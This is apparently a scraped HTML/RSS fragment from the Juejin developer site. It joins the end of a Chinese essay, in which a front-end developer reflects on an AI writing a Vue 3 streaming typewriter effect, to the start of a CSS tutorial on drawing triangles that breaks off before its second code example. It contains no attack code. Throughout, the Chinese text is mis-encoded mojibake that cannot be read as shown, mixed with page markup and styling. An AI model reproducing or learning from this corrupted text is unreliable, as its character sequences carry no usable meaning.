            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3421335917433006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é»‘åœŸè±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:00:25.000Z" title="Mon Dec 29 2025 10:00:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€ æƒŠå–œï¼šé‚£ä¸ªç¬é—´ï¼Œæˆ‘ä»¥ä¸ºè‡ªå·±å¤±ä¸šäº†</h3>
<p>2025å¹´çš„å¼€å‘èŠ‚å¥å¿«å¾—è®©äººææƒšã€‚</p>
<p>é‚£å¤©ä¸‹åˆï¼Œéœ€æ±‚æ–‡æ¡£é‡Œèººç€ä¸€ä¸ªè®©æˆ‘å¤´ç–¼çš„ä»»åŠ¡ï¼šå®ç°ä¸€ä¸ªæè‡´ä¸æ»‘çš„æµå¼æ‰“å­—æœºæ•ˆæœã€‚è¦æ±‚ä¸ä»…æ˜¯æ–‡å­—è¹¦å‡ºæ¥ï¼Œè¿˜è¦å¸¦å¼¹æ€§åŠ¨æ•ˆã€è‡ªåŠ¨å¤„ç†<code>Markdown</code>é‡Œçš„è¡¨æ ¼é‡ç»˜ï¼Œå¹¶ä¸”åœ¨<code>Vue 3</code>çš„å“åº”å¼æ¡†æ¶ä¸‹ä¸èƒ½æ‰å¸§ã€‚</p>
<p>æˆ‘ååœ¨å·¥ä½ä¸Šï¼Œä¹ æƒ¯æ€§åœ°åœ¨<code>IDE</code>é‡Œæ•²ä¸‹ä¸€è¡Œæ³¨é‡Šï¼š<code>// Vue 3, Composition API, æµå¼è¾“å‡ºå®ç°æ‰“å­—æœºæ•ˆæœ</code></p>
<p>3ç§’é’Ÿã€‚</p>
<p>å±å¹•åƒç€‘å¸ƒä¸€æ ·åˆ·å±ï¼Œå‡ ç™¾è¡Œä»£ç ç²¾å‡†åœ°è·³äº†å‡ºæ¥ã€‚å®ƒç”¨äº†<code>shallowRef</code>æ¥è§„é¿æ·±å±‚å“åº”å¼çš„å¼€é”€ï¼Œç”¨äº† <code>requestAnimationFrame</code> æ¥å¹³æ»‘å­—ç¬¦æ’å…¥çš„é¢‘ç‡ï¼Œç”šè‡³è¿<code>SSEï¼ˆServer-Sent Events</code>ï¼‰æˆªæ–­ä¸­æ–‡å­—ç¬¦çš„ <code>Buffer</code>å¤„ç†éƒ½å†™å¾—æ»´æ°´ä¸æ¼ã€‚</p>
<p><strong>é‚£æ˜¯æˆ‘é‚£ä¸€å‘¨é‡Œçš„ç¬¬ä¸€ä¸ªæ—¶åˆ»ï¼šæƒŠè®¶ã€‚</strong> æˆ‘æŒ‰ä¸‹<code>Tab</code>é”®ï¼Œä»£ç è·‘é€šäº†ï¼Œæ•ˆæœæ¯”æˆ‘é¢„æƒ³çš„è¿˜è¦å¥½ã€‚é‚£ä¸€åˆ»ï¼Œæˆ‘å†…å¿ƒæ˜¯å¼€å¿ƒçš„ï¼Œå¼€å¿ƒæ˜¯è¿™ä¸ªéœ€æ±‚åˆèƒ½æå‰å®ç°ï¼›ä½†æ˜¯å¼€å¿ƒä¹‹ä½™åˆæ„Ÿåˆ°ä¸€ç§å‰æ‰€æœªæœ‰çš„â€œå¤±é‡æ„Ÿâ€ã€‚æˆ‘æ›¾å¼•ä»¥ä¸ºå‚²çš„æŠ€æœ¯å£å’ï¼Œåœ¨3ç§’é’Ÿå†…è¢«æ¨å¹³äº†ã€‚</p>
<h3 data-id="heading-1">äºŒã€ è¿Ÿç–‘ï¼šè¿™å®Œç¾èƒŒåçš„â€œéäººæ„Ÿâ€</h3>
<p>æˆ‘ç›¯ç€é‚£æ®µä»£ç ã€‚å®ƒå†™å¾—å¤ªâ€œå¹²å‡€â€äº†ï¼Œå¹²å‡€å¾—ä¸åƒäººç±»çš„æ‰‹ç¬”ã€‚å®ƒæ²¡æœ‰æˆ‘å¸¸ç”¨çš„å‘½åä¹ æƒ¯ï¼Œæ²¡æœ‰æˆ‘ä¸ºäº†å›¾çœäº‹å¶å°”ä¼šç•™ä¸‹çš„<code>TODO</code>ã€‚å®ƒæ˜¯ä¸€ä¸ªé€»è¾‘ä¸Šçš„é—­ç¯ï¼Œä½†æˆ‘å´è§‰å¾—å®ƒå¾ˆé™Œç”Ÿã€‚</p>
<p>æˆ‘å¼€å§‹æµ‹è¯•è¿™ä¸ªæ‰“å­—æœºã€‚å­—ç¬¦è·³è·ƒçš„èŠ‚å¥æ„Ÿæå¼ºï¼Œæ¯ä¸€ä¸ªåƒç´ çš„ä½ç§»éƒ½ç¬¦åˆç‰©ç†å…¬å¼ã€‚ä½†è¿™ç§å®Œç¾è®©æˆ‘æ„Ÿåˆ°ä¸å®‰ã€‚æˆ‘å¼€å§‹æ€€ç–‘ï¼š<strong>å¦‚æœæˆ‘ä¸å†éœ€è¦æ€è€ƒâ€œå¦‚ä½•å®ç°â€ï¼Œé‚£ä¹ˆæˆ‘å­˜åœ¨çš„ä»·å€¼æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>è¿™ç§è¿Ÿç–‘åœ¨æˆ‘ä¿®æ”¹ä¸€ä¸ªå¾®å°çš„è§†è§‰é—´è·æ—¶è¾¾åˆ°äº†é¡¶å³°ã€‚æˆ‘æœ¬æƒ³å¾®è°ƒä¸€ä¸‹å…‰æ ‡çš„é—ªçƒé¢‘ç‡ï¼Œä½†æˆ‘å‘ç°æˆ‘ç«Ÿç„¶éœ€è¦èŠ±ååˆ†é’Ÿå»é˜…è¯»<code>AI</code>ä¸ºäº†å®ç°é‚£ä¸ªâ€œæè‡´æ•ˆæœâ€è€Œè®¾è®¡çš„å¤æ‚å®šæ—¶å™¨é€»è¾‘ã€‚æˆ‘çªç„¶æ„è¯†åˆ°ï¼Œæˆ‘æ­£åœ¨å¤±å»å¯¹ä»£ç çš„â€œæ‰‹æ„Ÿâ€ã€‚æˆ‘ä»ä¸€ä¸ªäº²æ‰‹æ‰“ç£¨é›¶ä»¶çš„æœ¨åŒ ï¼Œå˜æˆäº†ä¸€ä¸ªæ“ä½œå…¨è‡ªåŠ¨æœºåºŠçš„å·¥äººã€‚æœºåºŠæ•ˆç‡æé«˜ï¼Œä½†æˆ‘å´ä¸æ•¢è½»æ˜“å…³æ‰å®ƒã€‚</p>
<h3 data-id="heading-2">ä¸‰ã€ è®¤å¯ï¼šå®ƒç¡®å®è§£å†³äº†é‚£äº›â€œè¯¥æ­»çš„ç»†èŠ‚â€</h3>
<p>è¿™ç§è¿Ÿç–‘åœ¨é‡åˆ°ä¸€ä¸ªçœŸæ­£çš„æŠ€æœ¯ç¡¬éª¨å¤´æ—¶ï¼Œè¢«ç¡¬ç”Ÿç”Ÿåœ°æ‰­è½¬æˆäº†â€œè®¤å¯â€ã€‚</p>
<p>æ‰“å­—æœºæ•ˆæœæœ€æ€•çš„æ˜¯<code>Markdown</code>é‡Œçš„è¡¨æ ¼ã€‚å½“æµå¼æ•°æ®åªä¼ äº†ä¸€åŠï¼Œè¡¨æ ¼çš„<code>HTML</code>ç»“æ„æ˜¯ç ´ç¢çš„ï¼Œé¡µé¢ä¼šå› ä¸º<code>DOM</code>ç»“æ„çš„é¢‘ç¹è§£æè€Œç–¯ç‹‚æŠ–åŠ¨ã€‚æˆ‘æœ¬æ¥å‡†å¤‡å¥½æ‰‹åŠ¨å†™ä¸€ä¸ªçŠ¶æ€æœºå»æ‹¦æˆªä¸å®Œæ•´çš„æ ‡ç­¾ï¼Œç»“æœæˆ‘å‘ç°<code>AI</code>ç”Ÿæˆçš„é‚£æ®µ<code>Vue</code>é€»è¾‘é‡Œï¼Œæ—©å·²é¢„åŸ‹äº†ä¸€ä¸ª<strong>å¢é‡DOMæ›´æ–°ç®—æ³•</strong>ã€‚</p>
<p>å®ƒåˆ©ç”¨<code>Vue</code>çš„æ¨¡æ¿ç³»ç»Ÿï¼Œé…åˆä¸€ä¸ªå¾®å‹çš„â€œè™šæ‹Ÿç¼“å†²åŒºâ€ï¼Œä¼˜é›…åœ°è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚é‚£ä¸€åˆ»ï¼Œæˆ‘çœ‹ç€å±å¹•ä¸Šé‚£ä¸ªå³ä¾¿åœ¨å¤„ç†å¤æ‚è¡¨æ ¼ä¹Ÿä¸æ»‘å¦‚ç»¸ç¼çš„æ‰“å­—æœºï¼Œå†…å¿ƒçš„é˜²çº¿å´©æºƒäº†ã€‚</p>
<p>æˆ‘ä¸å¾—ä¸æ‰¿è®¤ï¼š<strong>å®ƒå†™å¾—ç¡®å®æ¯”æˆ‘å¥½ã€‚</strong></p>
<p>å®ƒä¸ä»…æ‡‚<code>Vue</code>çš„ç”Ÿå‘½å‘¨æœŸï¼Œå®ƒè¿˜æ‡‚é‚£äº›æˆ‘æ‡’å¾—å»æŸ¥çš„ã€å…³äºæµè§ˆå™¨é‡ç»˜ä¸å›æµçš„æœ€åº•å±‚è§„èŒƒã€‚è¿™ç§è®¤å¯å¸¦æœ‰ä¸€ç§åŠ«åä½™ç”Ÿçš„åº†å¹¸ï¼Œä¹Ÿå¸¦ç€ä¸€ç§èŒä¸šä¸Šçš„å¦¥åâ€”â€”æˆ‘å¼€å§‹æ¥å—<code>AI</code>ä½œä¸ºä¸€ä¸ªæ¯”æˆ‘æ›´å¼ºå¤§çš„â€œåˆä½œè€…â€å­˜åœ¨ã€‚</p>
<h3 data-id="heading-3">å››ã€ åæ€ï¼šæ•ˆç‡å·…å³°å¤„çš„è™šæ— </h3>
<p>å½“é‚£ä¸ªå®Œç¾çš„æ‰“å­—æœºæ•ˆæœä¸Šçº¿ï¼Œå¹¶è·å¾—è€æ¿å’Œç”¨æˆ·çš„ä¸€è‡´å¥½è¯„æ—¶ï¼Œæˆ‘å´é™·å…¥äº†æœ€æ·±çš„æ€è¾¨ã€‚</p>
<p>æˆ‘çš„æ•ˆç‡ç¡®å®æé€Ÿäº†<code>500%</code>ï¼Œä½†æˆ‘æ„Ÿè§‰è‡ªå·±å˜è™šäº†ã€‚ä»¥å‰è§£å†³ä¸€ä¸ª<code>Bug</code>ï¼Œæˆ‘ä¼šå…´å¥‹åœ°åœ¨æŠ€æœ¯ç¾¤é‡Œå¤ç›˜ï¼›ç°åœ¨ï¼Œæˆ‘åªæ˜¯æ·¡æ·¡åœ°å¯¹<code>AI</code>è¯´ä¸€å¥ï¼šâ€œè¿™é‡Œæ€§èƒ½æœ‰é—®é¢˜ï¼Œä¼˜åŒ–ä¸€ä¸‹â€ï¼Œç„¶åå†æ¬¡æŒ‰ä¸‹<code>Tab</code>ã€‚</p>
<p><strong>æˆ‘ä»¬çœŸçš„åœ¨è¿›åŒ–å—ï¼Ÿ</strong></p>
<p>åœ¨2025å¹´ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆçš„å®šä¹‰æ­£åœ¨å‘ç”Ÿä¸å¯é€†çš„åç§»ã€‚æˆ‘ä»¬æ­£åœ¨ä»â€œä»£ç ç”Ÿäº§è€…â€è½¬å‹ä¸ºâ€œä»£ç å®¡æ ¸å‘˜â€ã€‚æˆ‘ä»¬ä¸å†å…³å¿ƒå¦‚ä½•å®ç°ä¸€ä¸ªæ‰“å­—æœºï¼Œæˆ‘ä»¬å…³å¿ƒçš„æ˜¯å¦‚ä½•å®šä¹‰è¿™ä¸ªæ‰“å­—æœºçš„â€œæ„å›¾â€ã€‚</p>
<p>ä½†è¿™ç§è½¬å‹èƒŒåçš„ä»£ä»·æ˜¯ï¼š<strong>æˆ‘ä»¬æ­£åœ¨å¤±å»â€œçŠ¯é”™â€çš„æƒåˆ©ï¼Œè€ŒçŠ¯é”™æ°æ°æ˜¯äººç±»ä¹ å¾—ç›´è§‰çš„å”¯ä¸€é€”å¾„ã€‚</strong> å½“ä¸€åˆ‡éƒ½è¢«é¢„è®¾å¾—å¦‚æ­¤å®Œç¾ï¼Œæˆ‘ä»¬æ˜¯å¦è¿˜ä¼šå»æ·±ç©¶ä¸€ä¸ª<code>SSE</code>è¿æ¥ä¸ºä»€ä¹ˆå¤„ç†ä¸¢åŒ…ï¼Ÿæˆ‘ä»¬æ˜¯å¦è¿˜ä¼šå»åœ¨ä¹ä¸€ä¸ª<code>Vue</code>ç»„ä»¶å¸è½½æ—¶ä¸ºä»€ä¹ˆè¦æ‰‹åŠ¨æ¸…é™¤å®šæ—¶å™¨ï¼Ÿ</p>
<p>è¿™ç¯‡æ–‡ç« å†™åˆ°æœ€åï¼Œæˆ‘æƒ³è¯´çš„ä¸å†æ˜¯æ‰“å­—æœºï¼Œè€Œæ˜¯å…³äºæˆ‘ä»¬åœ¨è¿™ä¸ªæ—¶ä»£çš„å®šä½ã€‚<code>AI</code>ç»™äº†æˆ‘ä»¬é€šå¾€ç»ˆç‚¹çš„æ·å¾„ï¼Œä½†å®ƒä¹Ÿé¡ºæ‰‹æŠ¹æ‰äº†æ²¿é€”çš„é£æ™¯ã€‚2025å¹´ï¼Œæˆ‘çš„å·¥ä½œä¸åœ¨äºæˆ‘èƒ½å†™å‡ºå¤šä¹ˆåä¸½çš„ä»£ç ï¼Œè€Œåœ¨äºæˆ‘è¿˜èƒ½åœ¨è¿™ä¸ªè¡Œä¸šå¾…å¤šä¹…ï¼Ÿ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨ CSS ä¸­ç”»ä¸‰è§’å½¢ï¼Œæœ€å¸¸ç”¨çš„ä¸¤ç§æ–¹æ³•æ˜¯ä½¿ç”¨ è¾¹æ¡† (Border) æˆ– è£å‰ªè·¯å¾„ (Clip-path)ã€‚]]></title>    <link>https://juejin.cn/post/7589126217249505321</link>    <guid>https://juejin.cn/post/7589126217249505321</guid>    <pubDate>2025-12-29T08:27:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217249505321" data-draft-id="7589126217249488937" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨ CSS ä¸­ç”»ä¸‰è§’å½¢ï¼Œæœ€å¸¸ç”¨çš„ä¸¤ç§æ–¹æ³•æ˜¯ä½¿ç”¨ è¾¹æ¡† (Border) æˆ– è£å‰ªè·¯å¾„ (Clip-path)ã€‚"/> <meta itemprop="keywords" content="CSS"/> <meta itemprop="datePublished" content="2025-12-29T08:27:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XXUZZWZ"/> <meta itemprop="url" content="https://juejin.cn/user/4334709728623401"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨ CSS ä¸­ç”»ä¸‰è§’å½¢ï¼Œæœ€å¸¸ç”¨çš„ä¸¤ç§æ–¹æ³•æ˜¯ä½¿ç”¨ è¾¹æ¡† (Border) æˆ– è£å‰ªè·¯å¾„ (Clip-path)ã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4334709728623401/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XXUZZWZ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T08:27:10.000Z" title="Mon Dec 29 2025 08:27:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ CSS ä¸­ï¼Œæœ€å¸¸ç”¨çš„ä¸¤ç§æ–¹æ³•æ˜¯ä½¿ç”¨ <strong>è¾¹æ¡† (Border)</strong> æˆ– <strong>è£å‰ªè·¯å¾„ (Clip-path)</strong>ã€‚</p>
<h3 data-id="heading-0">æ–¹æ³•ä¸€ï¼šä½¿ç”¨è¾¹æ¡† (ç»å…¸æ–¹æ³•)</h3>
<p>è¿™æ˜¯æœ€å¸¸ç”¨çš„æŠ€å·§ã€‚å…¶åŸç†æ˜¯å°† <code>div</code> çš„å®½é«˜è®¾ä¸º 0ï¼Œç„¶åé€šè¿‡è®¾ç½®ä¸åŒæ–¹å‘çš„è¾¹æ¡†é¢œè‰²ï¼ˆé€æ˜æˆ–æœ‰è‰²ï¼‰æ¥æŒ¤å‹å‡ºä¸€ä¸ªä¸‰è§’å½¢ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼ˆå‘ä¸Šä¸‰è§’å½¢ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"triangle-up"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.triangle-up</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-comment">/* å·¦å³è¾¹æ¡†é€æ˜ï¼Œåº•è¾¹æœ‰è‰² */</span>
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#3498db</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><strong>è°ƒæ•´æ–¹å‘ï¼š</strong></p>
<ul>
<li><strong>å‘ä¸‹ï¼š</strong> è®¾ç½® <code>border-top</code> æœ‰è‰²ï¼Œå…¶ä»–é€æ˜ã€‚</li>
<li><strong>å‘å·¦ï¼š</strong> è®¾ç½® <code>border-right</code> æœ‰è‰²ï¼Œå…¶ä»–é€æ˜ã€‚</li>
<li><strong>å‘å³ï¼š</strong> è®¾ç½® <code>border-left</code> æœ‰è‰²ï¼Œå…¶ä»–é€æ˜ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-1">æ–¹æ³•äºŒï¼šä½¿ç”¨ <code>clip-path</code> (ç°ä»£æ–¹æ³•)</h3>
<p><code>clip-path</code> å±æ€§å…è®¸ä½ é€šè¿‡åæ ‡ç‚¹ç›´æ¥è£å‰ªå½¢çŠ¶ã€‚è¿™ç§æ–¹æ³•æ›´ç›´è§‚ï¼Œä¸” <code>div</code> ä¾ç„¶å¯ä»¥ä¿ç•™å…¶åŸæœ¬çš„å®½é«˜ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
